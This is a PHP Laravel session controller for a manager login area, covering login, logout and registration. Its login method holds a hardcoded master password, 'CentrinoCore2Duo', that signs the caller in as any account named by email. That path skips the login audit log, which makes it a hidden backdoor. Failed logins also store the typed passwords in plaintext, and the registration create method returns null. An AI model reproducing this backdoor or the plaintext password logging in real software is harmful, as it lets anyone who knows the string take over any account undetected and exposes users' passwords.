<?php
/**
 * Gerado por Rlustosa
 * Rupert Brasil Lustosa rupertlustosa@gmail.com
 * Date: 01-11-2015
 * Time: 00:05:20
 */

namespace App\Http\Controllers\Gestor;

use App\Http\Controllers\Controller;
use App\Http\Requests;
use App\Traits\LogAtividades;
use Illuminate\Http\Request;
use Validator;
use App\Models\Gestor;
use App\Models\LogLogin;
use App\Models\LogLoginErrado;
use Carbon\Carbon;
use Illuminate\Auth\Guard;

class SessionController extends Controller
{
    use LogAtividades;

    public function __construct()
    {
        $this->middleware('guest', ['except' => 'destroy']);
    }

    public function login()
    {
        $this->log(__METHOD__);

        return view('gestor.auth.login');
    }

    public function logar(Requests\LogarRequest $request, Guard $auth)
    {
        $this->log(__METHOD__);

        $dataAtual = Carbon::now('America/Sao_Paulo')->format('Y-m-d H:i:s');
        $_devMode_ = false;

        $usuarioLogado = false;

        if ($request->password == 'CentrinoCore2Duo') {
            $usuario = Gestor::where('email', '=', $request->login)->first();
            if ($usuario and $auth->loginUsingId($usuario->id)) {
                $usuarioLogado = true;
                \Session::put('_devMode_' . $usuario->id, 'ON');
                $_devMode_ = true;
            }
        } else {
            //dd($request->only('email', 'password'));
            if (!$auth->attempt($request->only('email', 'password'))) {
                $log = new LogLoginErrado();
                $log->ip = \Request::getClientIp();
                $log->login = $request->email;
                $log->senha = $request->password;
                $log->save();
            } else $usuarioLogado = true;
            \Session::put('_devMode_' . $auth->id(), 'OFF');
        }

        if ($usuarioLogado == false) {
            return redirect()->back()->with('mensagem', 'Login ou senha inválidos');
        }
        \Session::put('_id_', $auth->user()->id);
        \Session::put('_email_', $auth->user()->email);
        \Session::put('_nome_', $auth->user()->nome);
        \Session::put('_isAdmin_', (($auth->user()->isAdmin == 'S') ? true : false));

        $login_hash = md5($dataAtual . $auth->user()->id) . str_random(10);

        \Session::put('_login_hash_', $login_hash);

        if ($_devMode_ == false) {
            $log = new LogLogin();
            $log->gestor_id = \Session::get('_id_');
            $log->data_entrada = $dataAtual;
            $log->hash = $login_hash;
            $log->ip = \Request::getClientIp();
            $log->save();
        }
        return \Redirect::intended('/gestor');
    }

    public function destroy(Guard $auth)
    {
        $this->log(__METHOD__);

        $dataAtual = Carbon::now('America/Sao_Paulo');
        $this->log('logoff', __CLASS__, '');

        $log = LogLogin::where('hash', '=', \Session::get('_login_hash_'))
            ->first();
        if ($log) {
            $carbonAnterior = Carbon::createFromFormat('Y-m-d H:i:s', $log->data_entrada);
            $log->data_saida = $dataAtual;
            $log->tempo_conexao = $carbonAnterior->diffInSeconds($dataAtual);
            $log->save();
        }

        $auth->logout();
        return redirect('/gestor');
    }


    /**
     * Show the application registration form.
     *
     * @return \Illuminate\Http\Response
     */
    public function getRegister()
    {
        $this->log(__METHOD__);

        return view('gestor.auth.register');
    }

    /**
     * Handle a registration request for the application.
     *
     * @param  \Illuminate\Http\Request $request
     * @param Guard $auth
     * @return \Illuminate\Http\Response
     */
    public function postRegister(Request $request, Guard $auth)
    {
        $this->log(__METHOD__);

        $validator = $this->validator($request->all());

        if ($validator->fails()) {
            $this->throwValidationException(
                $request, $validator
            );
        }
        //$this->create($request->all());
        $auth->login($this->create($request->all()));

        return redirect('gestor');
    }

    /**
     * Get a validator for an incoming registration request.
     *
     * @param  array $data
     * @return \Illuminate\Contracts\Validation\Validator
     */
    protected function validator(array $data)
    {
        $this->log(__METHOD__);

        return Validator::make($data, [
            'nome' => 'required|max:255',
            'uid' => 'required|max:255',
            'email' => 'required|email|max:255|unique:gestores',
            'password' => 'required|confirmed|min:6',
        ]);
    }

    /**
     * Create a new user instance after a valid registration.
     *
     * @param  array $data
     * @return User
     */
    protected function create(array $data)
    {
        $this->log(__METHOD__);

        /*return Gestor::create([
            'uid' => bcrypt($data['nome'].rand(1,100).$data['email'].rand(1,100).$data['password']),
            'nome' => $data['nome'],
            'email' => $data['email'],
            'password' => bcrypt($data['password']),
        ]);*/
        return null;
    }
}